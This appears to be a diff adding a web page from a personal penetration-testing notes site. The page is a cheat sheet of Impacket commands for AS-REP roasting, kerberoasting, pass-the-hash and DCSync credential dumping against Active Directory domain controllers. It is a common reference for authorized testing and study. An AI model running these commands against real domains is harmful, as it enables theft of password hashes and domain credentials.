@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/tool-cheat-sheets/impacket</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/tool-cheat-sheets/impacket"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Impacket</h1>
+
+<p>Python tools to work with network protocols, mostly Active Directory, Kerberos, LDAP and SMB.</p>
+
+<p>If you get a <code>clock skew too great</code> error executing commands, fix it with the following:</p>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Get the DC IP with NTP:</span>
+<span class="nb">sudo </span>ntpdate <span class="nt">-q</span> &lt;DC IP&gt;
+
+<span class="c"># Copy the beginning of the output and use it</span>
+<span class="c"># with faketime prepended to your command:</span>
+faketime <span class="s1">'2025-01-24 03:50:45.927649'</span> &lt;actual impacket <span class="nb">command</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<h2>GETNPUsers.py (ASREProast) commands</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Retrieve domain users who don't have kerberos preauth set,</span>
+<span class="c"># using an RPC null session. You can get their TGTs without</span>
+<span class="c"># knowing their passwords:</span>
+GetNPUsers.py <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-request</span> <span class="nt">-format</span> john <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/'</span>
+
+<span class="c"># Do it with a username wordlist instead of RPC: </span>
+GetNPUsers.py <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-usersfile</span> &lt;username wordlist&gt; <span class="nt">-request</span> <span class="nt">-format</span> john <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/'</span>
+
+<span class="c"># Do it with a LDAP authenticated bind:</span>
+GetNPUsers.py <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-request</span> <span class="nt">-format</span> john <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/&lt;username&gt;:&lt;password&gt;'</span>
+
+<span class="c"># Do it with a LDAP authenticated bind, using pass-the-hash:</span>
+GetNPUsers.py <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-request</span> <span class="nt">-format</span> john <span class="nt">-hashes</span> &lt;LMhash:NThash&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/&lt;username&gt;'</span>
+</code></pre></div>
+
+<h2>GETUserSPNs.py (kerberoast) commands</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Get password hashes of kerberoastable user accounts:</span>
+GetUserSPNs.py <span class="nt">-outputfile</span> kerberoastables.txt <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/&lt;username&gt;:&lt;password&gt;'</span>
+
+<span class="c"># Get password hashes using pass-the-hash rather than a password:</span>
+GetUserSPNs.py <span class="nt">-outputfile</span> kerberoastables.txt <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-hashes</span> &lt;LMhash:NThash&gt; <span class="s1">'&lt;domain name&gt;/&lt;username&gt;'</span>
+
+<span class="c"># Request TGS of user accounts:</span>
+GetUserSPNs.py <span class="nt">-outputfile</span> TGSes.txt <span class="nt">-request</span> <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="s1">'&lt;domain name&gt;/&lt;username&gt;:&lt;password&gt;'</span>
+
+<span class="c"># Perform kerberoast with preauth:</span>
+GetUserSPNs.py <span class="nt">-no-preauth</span> <span class="s2">"&lt;username without preauth&gt;"</span> <span class="nt">-usersfile</span> <span class="s2">"&lt;username wordlist&gt;"</span> <span class="nt">-dc-host</span> <span class="s2">"&lt;DC IP or host&gt;"</span> <span class="s1">'&lt;domain name&gt;/'</span>
+</code></pre></div>
+
+<h2>Secretsdump.py (DCSync dump) commands</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Perform DCSync using an account with</span>
+<span class="c"># appropriate permissions:</span>
+secretsdump.py <span class="nt">-outputfile</span> dcsync.txt <span class="nt">-just-dc</span> <span class="s1">'&lt;domain name&gt;/&lt;username&gt;:&lt;password&gt;@&lt;DC IP&gt;'</span>
+</code></pre></div>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://tools.thehacker.recipes/impacket/examples/getuserspns.py" rel="nofollow">https://tools.thehacker.recipes/impacket/examples/getuserspns.py</a></li>
+<li><a href="https://tools.thehacker.recipes/impacket/examples/getnpusers.py" rel="nofollow">https://tools.thehacker.recipes/impacket/examples/getnpusers.py</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync" rel="nofollow">https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync</a></li>
+</ul>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
